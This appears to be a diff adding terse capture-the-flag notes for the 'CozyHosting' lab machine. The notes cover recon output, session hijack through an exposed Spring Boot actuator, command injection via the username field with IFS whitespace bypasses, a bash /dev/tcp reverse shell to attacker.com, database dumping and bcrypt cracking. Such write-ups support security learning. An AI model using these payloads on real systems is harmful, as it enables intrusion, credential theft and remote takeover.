@@ -1,0 +1,103 @@
+CozyHosting
+
+user flag:
+	port scanning: nmap -sC -sV 10.10.11.230 -v
+
+	PORT     STATE SERVICE   REASON  VERSION
+	22/tcp   open  ssh       syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+	| ssh-hostkey: 
+	|   256 4356bca7f2ec46ddc10f83304c2caaa8 (ECDSA)
+	| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEpNwlByWMKMm7ZgDWRW+WZ9uHc/0Ehct692T5VBBGaWhA71L+yFgM/SqhtUoy0bO8otHbpy3bPBFtmjqQPsbC8=
+	|   256 6f7a6c3fa68de27595d47b71ac4f7e42 (ED25519)
+	|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHVzF8iMVIHgp9xMX9qxvbaoXVg1xkGLo61jXuUAYq5q
+	80/tcp   open  http      syn-ack nginx 1.18.0 (Ubuntu)
+	|_http-title: Did not follow redirect to http://cozyhosting.htb
+	| http-methods: 
+	|_  Supported Methods: GET HEAD POST OPTIONS
+	|_http-server-header: nginx/1.18.0 (Ubuntu)
+	4444/tcp open  krb524?   syn-ack
+	8000/tcp open  http-alt? syn-ack
+	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+	* sudo vi /etc/hosts
+		ip_address cozyhosting.htb
+
+	* gobuster
+		/index                (Status: 200) [Size: 12706]
+		/login                (Status: 200) [Size: 4431]
+		/admin                (Status: 401) [Size: 97]
+		/logout               (Status: 204) [Size: 0]
+		/error                (Status: 500) [Size: 73]
+	* /error => gives whitelabel error page i.e spring boot application it have actuator
+	* /actuator
+	* /actuator/sessions , found username
+	* username: kanderson
+	* tried hydra / burpsuite intruder not working
+	* /actuator/mappings
+	* gives so much context
+
+	or
+
+	* dirsearch -u machine_ip
+
+	[19:58:00] 200 -    0B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js
+	[19:58:06] 400 -  435B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
+	[19:58:08] 400 -  435B  - /a%5c.aspx                                        
+	[19:58:10] 200 -  634B  - /actuator                                         
+	[19:58:10] 200 -    5KB - /actuator/env                                     
+	[19:58:10] 200 -  498B  - /actuator/sessions                                
+	[19:58:10] 200 -   15B  - /actuator/health
+	[19:58:10] 200 -   10KB - /actuator/mappings                                
+	[19:58:11] 200 -  124KB - /actuator/beans                                   
+	[19:58:11] 401 -   97B  - /admin                                            
+	[19:58:47] 200 -    0B  - /engine/classes/swfupload//swfupload_f9.swf       
+	[19:58:47] 200 -    0B  - /engine/classes/swfupload//swfupload.swf          
+	[19:58:47] 500 -   73B  - /error                                            
+	[19:58:48] 200 -    0B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/ 
+	[19:58:48] 200 -    0B  - /extjs/resources//charts.swf                      
+	[19:58:54] 200 -    0B  - /html/js/misc/swfupload//swfupload.swf            
+	[19:58:56] 200 -   12KB - /index                                            
+	[19:59:01] 200 -    4KB - /login                                            
+	[19:59:02] 200 -    0B  - /login.wdm%2e                                     
+	[19:59:03] 204 -    0B  - /logout                                           
+	[19:59:25] 400 -  435B  - /servlet/%C0%AE%C0%AE%C0%AF 
+
+	* /actuator/sessions -> sessionID
+	* checking cookie 
+	* /admin -> burpsuite and have kandreson sessionId
+	* sees hostname and username part -> burpsuite it 
+	* Repeater, hostname : cozyhosting and username : test
+	* checking I can able to insert any code on the username
+	* username: `id` , working
+	* username: `curl http://ip:4444` , nc -lvnp 4444 -> working but shows no whitespace characters
+	* no whitespace characters so username: `IFS=_;command='curl_http://ip:4444';$command`
+	* got something but sessions closes soon
+	* okay, export RHOST=attacker.com
+			export RPORT=4444
+			bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'
+			create one file called shell.sh
+	* username: `IFS=_;command='curl_http://ip:4444/shell.sh';$command`
+	* username: `IFS=_;command='chmod_777_shell.sh';$command`
+	* username: `IFS=_;command='shell.sh';$command`
+	* nc -lvnp 4444
+		got it
+	* still can't access the user folder
+	* there is one jar file, we can download it to our local system
+	* python3 -m http.server 80 -> machine
+	* host : curl http://machine_ip:80/cloudhosting-0.1.jar > cloudhosting.jar
+	* downloaded!
+	* open jar and search for properties file
+	* got the database config
+	* machine: psql -U postgres -h localhost -d cozyhosting
+	* \dt
+	* select * from users;
+	* got the password for the user josh
+	* use john to decrypt it
+	* john --format=bcrypt --wordlist=rockyou.txt hello.txt // hello.txt contains the crypt i.e password
+	* got password
+	* ssh josh@machine_ip, password boom user.txt found
+	* sudo -l
+	* ssh
+	* ssh reverse shell
+	* found root.txts
+
